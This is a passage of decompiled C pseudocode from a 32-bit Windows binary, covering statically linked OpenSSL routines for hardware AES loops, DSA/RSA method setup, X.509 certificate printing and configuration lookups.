  int v22; // [esp+8h] [ebp-24h]
  unsigned int v23; // [esp+Ch] [ebp-20h]
  char **v24; // [esp+10h] [ebp-1Ch]
  char v25[20]; // [esp+18h] [ebp-14h] BYREF

  v4 = a1;
  v5 = a2;
  if ( (a3 & 0xF) == 0 && (a4 & 0xF) == 0 )
  {
    v6 = __readeflags();
    sub_461350(&dword_5353C8, a3, v6);
    v9 = (_DWORD *)(v8 + 16);
    v10 = 0;
    v11 = 0;
    if ( (*v9 & 0x20) != 0
      || (LOBYTE(v10) = ((unsigned __int8)a1 & 0xF) == 0, LOBYTE(v11) = (a2 & 0xF) == 0, (v11 & v10) != 0) )
    {
      _EAX = v9 - 4;
      __asm { rep cmpxchg eax, esp }
      *((_OWORD *)v9 - 1) = *_EAX;
    }
    else
    {
      v12 = v7 & 0x1FF;
      if ( (v7 & 0x1FF) == 0 )
        v12 = 512;
      v24 = &v20;
      do
      {
        v20 = v4;
        v21 = v5;
        v22 = v7;
        v23 = v12;
        if ( ((unsigned __int8)v4 & 0xF) != 0 )
          v4 = v25;
        if ( (v5 & 0xF) != 0 )
          qmemcpy(v4, (const void *)v5, 4 * (v12 >> 2));
        _EAX = v9 - 4;
        __asm { rep cmpxchg eax, esp }
        *((_OWORD *)v9 - 1) = *_EAX;
        v15 = v20;
        v16 = v23;
        if ( ((unsigned __int8)v20 & 0xF) != 0 )
        {
          qmemcpy(v20, v25, 4 * (v23 >> 2));
          v15 = &v15[4 * (v16 >> 2) - v16];
        }
        v4 = &v15[v16];
        v5 = v16 + v21;
        v7 = v22 - v16;
        v12 = 512;
      }
      while ( v7 );
      if ( v25 != (char *)&v20 )
      {
        v17 = v25;
        do
        {
          *(_OWORD *)v17 = 0i64;
          v17 += 16;
        }
        while ( &v20 > (char **)v17 );
      }
    }
  }
}
// 461829: variable 'v8' is possibly undefined
// 46186E: variable 'v7' is possibly undefined
// 5353C8: using guessed type _DWORD dword_5353C8;

//----- (00461960) --------------------------------------------------------
void __cdecl sub_461960(char *a1, int a2, int a3, char a4)
{
  char *v5; // edi
  int v6; // esi
  int v7; // kr00_4
  int v8; // ecx
  int v9; // edx
  _DWORD *v10; // edx
  int v11; // eax
  int v12; // ebx
  unsigned int v13; // ebx
  char *v17; // edi
  unsigned int v18; // ebx
  char *v19; // eax
  char *v22; // [esp+0h] [ebp-2Ch] BYREF
  int v23; // [esp+4h] [ebp-28h]
  int v24; // [esp+8h] [ebp-24h]
  unsigned int v25; // [esp+Ch] [ebp-20h]
  char **v26; // [esp+10h] [ebp-1Ch]
  char v27[20]; // [esp+18h] [ebp-14h] BYREF

  v5 = a1;
  v6 = a2;
  if ( (a3 & 0xF) == 0 && (a4 & 0xF) == 0 )
  {
    v7 = __readeflags();
    sub_461350(&dword_5353C8, a3, v7);
    v10 = (_DWORD *)(v9 + 16);
    v11 = 0;
    v12 = 0;
    if ( (*v10 & 0x20) != 0
      || (LOBYTE(v11) = ((unsigned __int8)a1 & 0xF) == 0, LOBYTE(v12) = (a2 & 0xF) == 0, (v12 & v11) != 0) )
    {
      _EAX = v10 - 4;
      __asm { rep cmpxchg eax, ebp }
      *((_OWORD *)v10 - 1) = *_EAX;
    }
    else
    {
      v13 = v8 & 0x1FF;
      if ( (v8 & 0x1FF) == 0 )
        v13 = 512;
      _EBP = &v22;
      v26 = &v22;
      do
      {
        v22 = v5;
        v23 = v6;
        v24 = v8;
        v25 = v13;
        if ( ((unsigned __int8)v5 & 0xF) != 0 )
          v5 = v27;
        if ( (v6 & 0xF) != 0 )
          qmemcpy(v5, (const void *)v6, 4 * (v13 >> 2));
        _EAX = v10 - 4;
        __asm { rep cmpxchg eax, ebp }
        *((_OWORD *)v10 - 1) = *_EAX;
        v17 = v22;
        v18 = v25;
        if ( ((unsigned __int8)v22 & 0xF) != 0 )
        {
          qmemcpy(v22, v27, 4 * (v25 >> 2));
          v17 = &v17[4 * (v18 >> 2) - v18];
        }
        v5 = &v17[v18];
        v6 = v18 + v23;
        v8 = v24 - v18;
        v13 = 512;
      }
      while ( v8 );
      if ( v27 != (char *)&v22 )
      {
        v19 = v27;
        do
        {
          *(_OWORD *)v19 = 0i64;
          v19 += 16;
        }
        while ( &v22 > (char **)v19 );
      }
    }
  }
}
// 461999: variable 'v9' is possibly undefined
// 4619DE: variable 'v8' is possibly undefined
// 5353C8: using guessed type _DWORD dword_5353C8;

//----- (00461AD0) --------------------------------------------------------
void __cdecl sub_461AD0(int a1, int a2, int a3, char a4)
{
  int v6; // kr00_4
  int v7; // edx
  int v8; // edx
  __int64 v9; // mm0
  __int64 v10; // rcx
  unsigned int v11; // edi
  int v12; // eax
  int v16; // edi
  unsigned int v17; // ebx
  int v18; // esi
  unsigned int v19; // ecx
  __m128i v20; // xmm1
  __int64 *v21; // eax
  int v22; // [esp+0h] [ebp-2Ch] BYREF
  int v23; // [esp+4h] [ebp-28h]
  __int64 v24; // [esp+8h] [ebp-24h]
  int *v25; // [esp+10h] [ebp-1Ch]
  __int64 v26[2]; // [esp+18h] [ebp-14h] BYREF

  if ( (a3 & 0xF) == 0 && (a4 & 0xF) == 0 )
  {
    v6 = __readeflags();
    sub_461350(&dword_5353C8, a3, v6);
    v8 = v7 + 16;
    v9 = *(_QWORD *)(v8 - 16);
    HIDWORD(v10) = v10 & 0x1FF;
    if ( (v10 & 0x1FF) == 0 )
      HIDWORD(v10) = 512;
    v25 = &v22;
    do
    {
      v22 = a1;
      v23 = a2;
      v24 = v10;
      LODWORD(v10) = *(_DWORD *)(v8 - 4);
      v11 = 0;
      v12 = *(_DWORD *)(v8 - 8);
      do
      {
        HIDWORD(v26[v11 / 8 + 1]) = v10;
        v26[v11 / 8] = v9;
        LODWORD(v26[v11 / 8 + 1]) = v12;
        LODWORD(v10) = _byteswap_ulong(_byteswap_ulong(v10) + 1);
        v11 += 16;
      }
      while ( v11 < HIDWORD(v10) );
      *(_DWORD *)(v8 - 4) = v10;
      _EAX = v8 - 16;
      _ECX = HIDWORD(v10) >> 4;
      __asm { rep cmpxchg eax, ecx }
      v16 = v22;
      v17 = HIDWORD(v24);
      v18 = v23;
      v19 = 0;
      do
      {
        v20 = *(__m128i *)(v18 + v19);
        v19 += 16;
        *(__m128i *)(v16 + v19 - 16) = _mm_xor_si128(v20, *(__m128i *)((char *)&v24 + v19));
      }
      while ( v19 < v17 );
      a1 = v17 + v16;
      a2 = v17 + v18;
      LODWORD(v10) = v24 - v17;
      HIDWORD(v10) = 512;
    }
    while ( (_DWORD)v10 );
    v21 = v26;
    do
    {
      *(_OWORD *)v21 = 0i64;
      v21 += 2;
    }
    while ( &v22 > (int *)v21 );
    _m_empty();
  }
}
// 461B09: variable 'v7' is possibly undefined
// 461B28: variable 'v10' is possibly undefined
// 5353C8: using guessed type _DWORD dword_5353C8;

//----- (00461C00) --------------------------------------------------------
int sub_461C00()
{
  int result; // eax

  __asm { cmpxchg eax, eax }
  return result;
}

//----- (00461C10) --------------------------------------------------------
int __cdecl sub_461C10(_DWORD *a1, int a2, int a3)
{
  int result; // eax

  result = 1;
  if ( *a1 == -1073741819 )
  {
    *(_DWORD *)(a3 + 184) += 4;
    return 0;
  }
  return result;
}

//----- (00461E50) --------------------------------------------------------
_DWORD *__cdecl sub_461E50(const char *Src, int a2)
{
  _DWORD *v2; // esi
  void *v3; // eax

  v2 = sub_413430(0x30u);
  if ( v2 )
  {
    v3 = sub_4247B0(Src);
    *v2 = v3;
    if ( !v3 )
    {
      sub_413490(v2);
      sub_408310(10, 128, 65, (int)"crypto\\dsa\\dsa_meth.c", 30);
      return 0;
    }
    v2[8] = a2;
  }
  return v2;
}

//----- (00461EC0) --------------------------------------------------------
void __cdecl sub_461EC0(void **Block)
{
  if ( Block )
  {
    sub_413490(*Block);
    sub_413490(Block);
  }
}

//----- (00461EF0) --------------------------------------------------------
int __cdecl sub_461EF0(int a1, int a2)
{
  *(_DWORD *)(a1 + 28) = a2;
  return 1;
}

//----- (00461F10) --------------------------------------------------------
_DWORD *__cdecl sub_461F10(const char *Src, int a2)
{
  _DWORD *v2; // esi
  void *v3; // eax

  v2 = sub_413430(0x38u);
  if ( v2 )
  {
    v3 = sub_4247B0(Src);
    *v2 = v3;
    if ( !v3 )
    {
      sub_413490(v2);
      sub_408310(4, 162, 65, (int)"crypto\\rsa\\rsa_meth.c", 22);
      return 0;
    }
    v2[9] = a2;
  }
  return v2;
}

//----- (00461F80) --------------------------------------------------------
void __cdecl sub_461F80(void **Block)
{
  if ( Block )
  {
    sub_413490(*Block);
    sub_413490(Block);
  }
}

//----- (00461FB0) --------------------------------------------------------
int __cdecl sub_461FB0(int a1, int a2)
{
  *(_DWORD *)(a1 + 4) = a2;
  return 1;
}

//----- (00461FD0) --------------------------------------------------------
int __cdecl sub_461FD0(int a1, int a2)
{
  *(_DWORD *)(a1 + 12) = a2;
  return 1;
}

//----- (00461FF0) --------------------------------------------------------
int __cdecl sub_461FF0(int a1, int a2)
{
  *(_DWORD *)(a1 + 44) = a2;
  return 1;
}

//----- (00462010) --------------------------------------------------------
int __cdecl sub_462010(int a1, int a2)
{
  return sub_41BA70((int (__cdecl *)(int, char **))sub_433500, "CERTIFICATE", a1, a2, 0, 0, 0, 0, 0);
}
// 433500: using guessed type int sub_433500();

//----- (00462040) --------------------------------------------------------
BOOL __cdecl sub_462040(int a1, int *a2, int a3)
{
  int v3; // ebp
  int v4; // edi
  int v5; // esi
  const char *v6; // ecx

  v3 = a2[2];
  v4 = *a2;
  v5 = 0;
  if ( *a2 <= 0 )
    return sub_405110(a1, (int)"\n", 1) == 1;
  while ( v5 % 18 || sub_405110(a1, (int)"\n", 1) > 0 && sub_405340(a1, a3, a3) > 0 )
  {
    v6 = byte_4F1291;
    if ( v5 + 1 != v4 )
      v6 = word_4F1980;
    if ( sub_419190(a1, "%02x%s", *(unsigned __int8 *)(v5 + v3), v6) <= 0 )
      break;
    if ( ++v5 >= v4 )
      return sub_405110(a1, (int)"\n", 1) == 1;
  }
  return 0;
}

//----- (00462100) --------------------------------------------------------
int __cdecl sub_462100(int a1, int *a2, int *a3)
{
  int v4; // eax
  int v5; // eax
  int (__cdecl *v6)(int, int *, int *, int, _DWORD); // eax
  void *v7; // [esp+4h] [ebp-8h] BYREF
  int v8; // [esp+8h] [ebp-4h] BYREF

  if ( sub_4051D0(a1, (int)"    Signature Algorithm: ") <= 0 )
    return 0;
  if ( sub_422A00(a1, *a2) <= 0 )
    return 0;
  v4 = sub_423680(*a2);
  if ( v4 )
  {
    if ( sub_44BA60(v4, &v8, &v7) )
    {
      v5 = sub_430AB0(0, v7);
      if ( v5 )
      {
        v6 = *(int (__cdecl **)(int, int *, int *, int, _DWORD))(v5 + 84);
        if ( v6 )
          return v6(a1, a2, a3, 9, 0);
      }
    }
  }
  if ( a3 )
    return sub_462040(a1, a3, 9);
  return sub_4051D0(a1, (int)"\n") > 0;
}

//----- (004621E0) --------------------------------------------------------
int __cdecl sub_4621E0(int a1, int a2, int a3)
{
  int *v3; // edi
  int *v4; // ebx
  int i; // ebp
  int v6; // eax
  int v7; // ebp
  int j; // edi
  int v9; // eax
  const char *v10; // eax
  int v11; // ebx
  int k; // edi
  const char *v13; // eax
  char v15; // [esp+Bh] [ebp-5Dh]
  char v16; // [esp+Bh] [ebp-5Dh]
  int v17; // [esp+Ch] [ebp-5Ch] BYREF
  int v18; // [esp+10h] [ebp-58h]
  char v19[80]; // [esp+14h] [ebp-54h] BYREF

  v18 = a2;
  if ( sub_4535D0(a2) )
  {
    v3 = (int *)sub_453660(a2);
    v4 = (int *)sub_453680(a2);
    if ( v3 )
    {
      v15 = 1;
      sub_419190(a1, "%*sTrusted Uses:\n%*s", a3, byte_4F1291, a3 + 2, byte_4F1291);
      for ( i = 0; i < sub_426A30((int)v3); ++i )
      {
        if ( v15 )
          v15 = 0;
        else
          sub_4051D0(a1, (int)", ");
        v6 = sub_426A40(v3, i);
        sub_423740(v19, 80, v6, 0);
        sub_4051D0(a1, (int)v19);
      }
      sub_4051D0(a1, (int)"\n");
      v7 = a3;
    }
    else
    {
      v7 = a3;
      sub_419190(a1, "%*sNo Trusted Uses.\n", a3, byte_4F1291);
    }
    if ( v4 )
    {
      v16 = 1;
      sub_419190(a1, "%*sRejected Uses:\n%*s", v7, byte_4F1291, v7 + 2, byte_4F1291);
      for ( j = 0; j < sub_426A30((int)v4); ++j )
      {
        if ( v16 )
          v16 = 0;
        else
          sub_4051D0(a1, (int)", ");
        v9 = sub_426A40(v4, j);
        sub_423740(v19, 80, v9, 0);
        sub_4051D0(a1, (int)v19);
      }
      sub_4051D0(a1, (int)"\n");
    }
    else
    {
      sub_419190(a1, "%*sNo Rejected Uses.\n", v7, byte_4F1291);
    }
    v10 = (const char *)sub_4535E0(v18, 0);
    if ( v10 )
      sub_419190(a1, "%*sAlias: %s\n", v7, byte_4F1291, v10);
    v11 = sub_453620(v18, &v17);
    if ( v11 )
    {
      sub_419190(a1, "%*sKey Id: ", v7, byte_4F1291);
      for ( k = 0; k < v17; ++k )
      {
        v13 = word_4F1980;
        if ( !k )
          v13 = byte_4F1291;
        sub_419190(a1, "%s%02X", v13, *(unsigned __int8 *)(v11 + k));
      }
      sub_405110(a1, (int)"\n", 1);
    }
  }
  return 1;
}

//----- (00462440) --------------------------------------------------------
int __cdecl sub_462440(int a1, unsigned int **a2, int a3, int a4)
{
  char v4; // bl
  int v5; // eax
  unsigned int *v6; // ebp
  int v7; // edi
  const char *v8; // eax
  const char *v9; // eax
  int v10; // ecx
  signed int v11; // eax
  signed int v12; // edi
  int *v13; // eax
  int *v14; // eax
  int *v15; // eax
  int *v16; // eax
  int *v17; // eax
  int v18; // eax
  unsigned int *v19; // eax
  int v20; // eax
  int v22; // [esp-18h] [ebp-24h]
  int v23; // [esp-14h] [ebp-20h]
  int v24; // [esp-14h] [ebp-20h]
  char v25; // [esp+3h] [ebp-9h]
  int v26; // [esp+4h] [ebp-8h] BYREF
  int v27; // [esp+8h] [ebp-4h]

  v27 = 0;
  v25 = 32;
  v26 = 0;
  if ( (a3 & 0xF0000) == 0x40000 )
  {
    v25 = 10;
    v26 = 12;
  }
  if ( !a3 )
    v26 = 16;
  v4 = a4;
  if ( (a4 & 1) == 0 && (sub_405110(a1, (int)"Certificate:\n", 13) <= 0 || sub_405110(a1, (int)"    Data:\n", 10) <= 0) )
    goto LABEL_64;
  if ( (v4 & 2) == 0 )
  {
    v5 = sub_44CEA0(a2);
    if ( sub_419190(a1, "%8sVersion: %lu (0x%lx)\n", byte_4F1291, v5 + 1, v5) <= 0 )
      goto LABEL_64;
  }
  if ( (a4 & 4) == 0 )
  {
    if ( sub_405110(a1, (int)"        Serial Number:", 22) <= 0 )
      goto LABEL_64;
    v6 = (unsigned int *)sub_432E90((int)a2);
    if ( (int)*v6 > 4 || (sub_4081F0(), v7 = sub_431860(v6), sub_408220(), v7 == -1) )
    {
      v9 = " (Negative)";
      if ( v6[1] != 258 )
        v9 = byte_4F1291;
      if ( sub_419190(a1, "\n%12s%s", byte_4F1291, v9) <= 0 )
        goto LABEL_64;
      v10 = *v6;
      v11 = 0;
      if ( (int)*v6 > 0 )
      {
        do
        {
          v12 = v11 + 1;
          if ( sub_419190(a1, "%02x%c", *(unsigned __int8 *)(v11 + v6[2]), v11 + 1 != v10 ? 58 : 10) <= 0 )
            goto LABEL_64;
          v10 = *v6;
          v11 = v12;
        }
        while ( v12 < (int)*v6 );
      }
    }
    else
    {
      if ( v6[1] == 258 )
      {
        v7 = -v7;
        v8 = "-";
      }
      else
      {
        v8 = byte_4F1291;
      }
      if ( sub_419190(a1, " %s%lu (%s0x%lx)\n", v8, v7, v8, v7) <= 0 )
        goto LABEL_64;
    }
  }
  if ( (a4 & 8) != 0 || (v13 = (int *)sub_44CF00((int)a2), sub_462100(a1, v13, 0) > 0) )
  {
    if ( (a4 & 0x10) != 0
      || sub_419190(a1, "        Issuer:%c", v25) > 0
      && (v23 = a3, v14 = (int *)sub_432E70((int)a2), sub_445220(a1, v14, v26, v23) >= 0)
      && sub_405110(a1, (int)"\n", 1) > 0 )
    {
      if ( (a4 & 0x20) != 0
        || sub_405110(a1, (int)"        Validity\n", 17) > 0
        && sub_405110(a1, (int)"            Not Before: ", 24) > 0
        && (v15 = (int *)sub_404FF0((int)a2), sub_430F10(a1, v15))
        && sub_405110(a1, (int)"\n            Not After : ", 25) > 0
        && (v16 = (int *)sub_44CEB0((int)a2), sub_430F10(a1, v16))
        && sub_405110(a1, (int)"\n", 1) > 0 )
      {
        if ( (a4 & 0x40) != 0
          || sub_419190(a1, "        Subject:%c", v25) > 0
          && (v24 = a3, v17 = (int *)sub_432E80((int)a2), sub_445220(a1, v17, v26, v24) >= 0)
          && sub_405110(a1, (int)"\n", 1) > 0 )
        {
          if ( (a4 & 0x80u) == 0 )
          {
            v18 = sub_44CEC0((int)a2);
            sub_41D550(&a3, 0, 0, 0, v18);
            if ( sub_405110(a1, (int)"        Subject Public Key Info:\n", 33) <= 0
              || sub_419190(a1, "%12sPublic Key Algorithm: ", byte_4F1291) <= 0
              || sub_422A00(a1, a3) <= 0
              || sub_4051D0(a1, (int)"\n") <= 0 )
            {
              goto LABEL_64;
            }
            v19 = (unsigned int *)sub_432F70((int)a2);
            if ( v19 )
            {
              sub_41CC90(a1, v19, 16, 0);
            }
            else
            {
              sub_419190(a1, "%12sUnable to load Public Key\n", byte_4F1291);
              sub_406790(a1);
            }
          }
          if ( (a4 & 0x1000) != 0
            || ((sub_44CEE0((int)a2, &a3, &v26), !a3)
             || sub_419190(a1, "%8sIssuer Unique ID: ", byte_4F1291) > 0 && sub_462040(a1, (int *)a3, 12))
            && (!v26 || sub_419190(a1, "%8sSubject Unique ID: ", byte_4F1291) > 0 && sub_462040(a1, (int *)v26, 12)) )
          {
            if ( (a4 & 0x100) == 0 )
            {
              v22 = a4;
              v20 = sub_44CED0((int)a2);
              sub_4C97A0(a1, "X509v3 extensions", v20, v22, 8);
            }
            if ( (a4 & 0x200) != 0 || (sub_433560(&a3, &v26, (int)a2), sub_462100(a1, (int *)v26, (int *)a3) > 0) )
            {
              if ( (a4 & 0x400) != 0 || sub_4621E0(a1, (int)a2, 0) )
                v27 = 1;
            }
          }
        }
      }
    }
  }
LABEL_64:
  sub_413490(0);
  return v27;
}

//----- (00462950) --------------------------------------------------------
const char *sub_462950()
{
  return "C:\\Program Files (x86)\\Common Files\\SSL";
}

//----- (00462960) --------------------------------------------------------
int __cdecl sub_462960(char **a1)
{
  char **v1; // eax
  int result; // eax

  v1 = a1;
  if ( !a1 )
    v1 = sub_4C9900();
  result = ((int (__cdecl *)(char **))v1[1])(v1);
  if ( !result )
  {
    sub_408310(14, 111, 65, "crypto\\conf\\conf_lib.c", 188);
    return 0;
  }
  return result;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004629A0) --------------------------------------------------------
int __cdecl sub_4629A0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return (*(int (**)(void))(*(_DWORD *)a1 + 12))();
  return result;
}

//----- (004629C0) --------------------------------------------------------
int __cdecl sub_4629C0(int a1)
{
  if ( a1 )
    return (*(int (**)(void))(*(_DWORD *)a1 + 36))();
  sub_408310(14, 113, 105, "crypto\\conf\\conf_lib.c", 212);
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004629F0) --------------------------------------------------------
int __cdecl sub_4629F0(int a1, int a2)
{
  void *v3; // esp
  _DWORD *v4; // eax
  int v5; // [esp-8h] [ebp-14h]
  int v6[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( a1 )
  {
    if ( a2 )
    {
      v3 = alloca(12);
      v6[0] = a2;
      v5 = *(_DWORD *)(a1 + 8);
      v6[1] = 0;
      v4 = sub_424780(v5, (int)v6);
      if ( v4 )
        return v4[2];
      else
        return 0;
    }
    else
    {
      sub_408310(14, 108, 107, "crypto\\conf\\conf_lib.c", 252);
      return 0;
    }
  }
  else
  {
    sub_408310(14, 108, 105, "crypto\\conf\\conf_lib.c", 247);
    return 0;
  }
}
// 4CA6D0: conditional instruction was optimized away because %arg_0.4!=0
// 4CA6D8: conditional instruction was optimized away because %arg_4.4!=0
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00462A50) --------------------------------------------------------
char *__cdecl sub_462A50(int a1, const char *a2, char *VarName)
{
  char *result; // eax

  result = sub_4CA790(a1, a2, VarName);
  if ( !result )
  {
    if ( a1 )
    {
      sub_408310(14, 109, 108, "crypto\\conf\\conf_lib.c", 275);
      sub_408610(4, "group=", a2, " name=", VarName);
    }
    else
    {
      sub_408310(14, 109, 106, "crypto\\conf\\conf_lib.c", 272);
    }
    return 0;
  }
  return result;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00462AD0) --------------------------------------------------------
int __cdecl sub_462AD0(int a1, const char *a2, char *VarName, _DWORD *a4)
{
  int result; // eax
  unsigned __int8 *v5; // edi
  int v6; // edx

  if ( a4 )
  {
    result = (int)sub_462A50(a1, a2, VarName);
    v5 = (unsigned __int8 *)result;
    if ( result )
    {
      *a4 = 0;
      if ( (*(int (__cdecl **)(int, _DWORD))(*(_DWORD *)a1 + 28))(a1, *(unsigned __int8 *)result) )
      {
        do
        {
          *a4 = (*(int (__cdecl **)(int, _DWORD))(*(_DWORD *)a1 + 32))(a1, *v5) + 10 * *a4;
          v6 = *++v5;
        }
        while ( (*(int (__cdecl **)(int, int))(*(_DWORD *)a1 + 28))(a1, v6) );
      }
      return 1;
    }
  }
  else
  {
    sub_408310(14, 112, 67, (int)"crypto\\conf\\conf_lib.c", 286);
    return 0;
  }
  return result;
}

//----- (00462B70) --------------------------------------------------------
int __cdecl sub_462B70(int a1, int a2)
{
  ULONG_PTR SpinCount; // eax
  char v4[8]; // [esp+4h] [ebp-Ch] BYREF
  int v5; // [esp+Ch] [ebp-4h]

  if ( !a1 )
    return 0;
  SpinCount = stru_539288.SpinCount;
  if ( !stru_539288.SpinCount )
  {
    SpinCount = (ULONG_PTR)sub_4C9900();
    stru_539288.SpinCount = SpinCount;
  }
  (*(void (__cdecl **)(char *))(SpinCount + 8))(v4);
  v5 = a1;
  return sub_4629F0((int)v4, a2);
}

//----- (00462BD0) --------------------------------------------------------
char *__cdecl sub_462BD0(int a1, const char *a2, char *VarName)
{
  char *result; // eax
  ULONG_PTR SpinCount; // eax
  int v5[3]; // [esp+4h] [ebp-Ch] BYREF

  if ( a1 )
  {
    SpinCount = stru_539288.SpinCount;
    if ( !stru_539288.SpinCount )
    {
      SpinCount = (ULONG_PTR)sub_4C9900();
      stru_539288.SpinCount = SpinCount;
    }
    (*(void (__cdecl **)(int *))(SpinCount + 8))(v5);
    v5[2] = a1;
    return sub_462A50((int)v5, a2, VarName);
  }
  else
  {
    result = sub_4CA790(0, a2, VarName);
    if ( !result )
    {
      sub_408310(14, 109, 106, (int)"crypto\\conf\\conf_lib.c", 272);
      return 0;
    }
  }
  return result;
}

//----- (00462C60) --------------------------------------------------------
int __cdecl sub_462C60(int a1)
{
  ULONG_PTR SpinCount; // eax
  int v3[3]; // [esp+0h] [ebp-Ch] BYREF

  SpinCount = stru_539288.SpinCount;
  if ( !stru_539288.SpinCount )
  {
    SpinCount = (ULONG_PTR)sub_4C9900();
    stru_539288.SpinCount = SpinCount;
  }
  (*(void (__cdecl **)(int *))(SpinCount + 8))(v3);
  v3[2] = a1;
  return (*(int (__cdecl **)(int *))(v3[0] + 16))(v3);
}

//----- (00462CC0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int sub_462CC0()
{
  __m64 *v0; // esi
  unsigned int *v1; // edi
  const __m128i *v2; // ebp
  unsigned int result; // eax
  __m64 v4; // mm0
  __m64 v5; // mm1
  __m64 v6; // mm2
  __m64 v7; // mm3
  __m64 v8; // mm4
  __m64 v9; // mm5
  __m64 v10; // mm6
  __m64 v11; // mm7
  __m64 v12; // mm2
  __m64 v13; // mm3
  unsigned int v14; // eax
  unsigned int v15; // ebx
  int v16; // edx
  unsigned int v17; // eax
  unsigned int v18; // ebx
  __m64 v19; // mm1
  unsigned int v20; // eax
  __m64 v21; // mm7
  unsigned int v22; // ebx
  __m64 v23; // mm7
  __m64 v24; // mm1
  __m64 v25; // mm5
  __m64 v26; // mm4
  __m64 v27; // mm0
  __m64 v28; // mm3
  __m64 v29; // mm1
  __m64 v30; // mm3
  __m64 v31; // mm4
  __m64 v32; // mm3
  __m64 v33; // mm7
  __m64 v34; // mm6
  __m64 v35; // mm5
  __m64 v36; // mm7
  __m64 v37; // mm6
  __m64 v38; // mm0
  __m64 v39; // mm6
  __m64 v40; // mm3
  __m64 v41; // mm1
  __m64 v42; // mm5
  __m64 v43; // mm4
  __m64 v44; // mm0
  __m64 v45; // mm3
  __m64 v46; // mm1
  __m64 v47; // mm3
  __m64 v48; // mm4
  __m64 v49; // mm3
  __m64 v50; // mm4
  __m64 v51; // mm7
  __m64 v52; // mm6
  __m64 v53; // mm5
  __m64 v54; // mm7
  __m64 v55; // mm6
  __m64 v56; // mm0
  __m64 v57; // mm6
  __m64 v58; // mm7
  __m64 v59; // mm3
  __m64 v60; // mm2
  __m64 *v61; // ebp
  __m64 v62; // mm3
  __m64 v63; // mm0
  int v64; // edx
  __m64 v65; // mm1
  __m64 v66; // mm0
  __m64 v67; // mm3
  __m64 v68; // mm7
  __m64 v69; // mm3
  __m64 v70; // mm1
  __m64 v71; // mm5
  __m64 v72; // mm6
  __m64 v73; // mm7
  __m64 v74; // mm1
  __m64 v75; // mm5
  __m64 v76; // mm4
  __m64 v77; // mm3
  __m64 v78; // mm1
  __m64 v79; // mm3
  __m64 v80; // mm4
  __m64 v81; // mm3
  __m64 v82; // mm4
  __m64 v83; // mm7
  __m64 v84; // mm6
  __m64 v85; // mm5
  __m64 v86; // mm7
  __m64 v87; // mm6
  __m64 v88; // mm0
  __m64 *v89; // ebp
  __m64 v90; // mm1
  __m64 v91; // mm2
  __m64 v92; // mm3
  __m64 v93; // mm7
  __m64 v94; // mm3
  __m64 v95; // mm1
  __m64 v96; // mm5
  __m64 v97; // mm6
  __m64 v98; // mm7
  __m64 v99; // mm1
  __m64 v100; // mm5
  __m64 v101; // mm4
  __m64 v102; // mm3
  __m64 v103; // mm1
  __m64 v104; // mm3
  __m64 v105; // mm4
  __m64 v106; // mm7
  __m64 v107; // mm6
  __m64 v108; // mm5
  __m64 v109; // mm7
  __m64 v110; // mm6
  __m64 v111; // mm6
  __m128i si128; // xmm1
  __m128i v113; // xmm0
  __m128i v114; // xmm2
  __m128i v115; // xmm1
  __m128i v116; // xmm3
  __m128i v117; // xmm2
  __m128i v118; // xmm4
  __m128i v119; // xmm3
  __m128i v120; // xmm5
  __m128i v121; // xmm4
  __m128i v122; // xmm6
  __m128i v123; // xmm5
  __m128i v124; // xmm7
  __m128i v125; // xmm6
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i v128; // xmm2
  const __m128i *v129; // ebp
  const __m128i *v130; // ebx
  int v131; // ecx
  __m64 v132; // mm2
  __m64 v133; // mm3
  __m128i v134; // xmm1
  __m128i v135; // xmm3
  __m128i v136; // xmm4
  __m128i v137; // xmm2
  __m128i v138; // xmm0
  __m128i v139; // xmm3
  __m128i v140; // xmm4
  __m128i v141; // xmm3
  __m128i v142; // xmm0
  __m128i v143; // xmm3
  __m128i v144; // xmm2
  __m128i v145; // xmm0
  __m64 v146; // mm1
  __m64 v147; // mm5
  __m64 v148; // mm4
  __m64 v149; // mm0
  __m64 v150; // mm3
  __m64 v151; // mm1
  __m64 v152; // mm3
  __m64 v153; // mm4
  __m64 v154; // mm3
  __m64 v155; // mm4
  __m64 v156; // mm7
  __m64 v157; // mm6
  __m64 v158; // mm5
  __m64 v159; // mm7
  __m64 v160; // mm6
  __m64 v161; // mm0
  __m64 v162; // mm2
  __m64 v163; // mm1
  __m64 v164; // mm5
  __m64 v165; // mm4
  __m64 v166; // mm2
  __m64 v167; // mm3
  __m64 v168; // mm1
  __m64 v169; // mm3
  __m64 v170; // mm4
  __m64 v171; // mm3
  __m64 v172; // mm4
  __m64 v173; // mm7
  __m64 v174; // mm6
  __m64 v175; // mm5
  __m64 v176; // mm7
  __m64 v177; // mm6
  __m64 v178; // mm2
  __m64 v179; // mm0
  __m128i v180; // xmm2
  __m128i v181; // xmm4
  __m128i v182; // xmm5
  __m128i v183; // xmm3
  __m128i v184; // xmm1
  __m128i v185; // xmm4
  __m128i v186; // xmm5
  __m128i v187; // xmm4
  __m128i v188; // xmm1
  __m128i v189; // xmm4
  __m128i v190; // xmm3
  __m128i v191; // xmm1
  __m64 v192; // mm1
  __m64 v193; // mm5
  __m64 v194; // mm4
  __m64 v195; // mm0
  __m64 v196; // mm3
  __m64 v197; // mm1
  __m64 v198; // mm3
  __m64 v199; // mm4
  __m64 v200; // mm3
  __m64 v201; // mm4
  __m64 v202; // mm7
  __m64 v203; // mm6
  __m64 v204; // mm5
  __m64 v205; // mm7
  __m64 v206; // mm6
  __m64 v207; // mm0
  __m64 v208; // mm2
  __m64 v209; // mm1
  __m64 v210; // mm5
  __m64 v211; // mm4
  __m64 v212; // mm2
  __m64 v213; // mm3
  __m64 v214; // mm1
  __m64 v215; // mm3
  __m64 v216; // mm4
  __m64 v217; // mm3
  __m64 v218; // mm4
  __m64 v219; // mm7
  __m64 v220; // mm6
  __m64 v221; // mm5
  __m64 v222; // mm7
  __m64 v223; // mm6
  __m64 v224; // mm2
  __m64 v225; // mm0
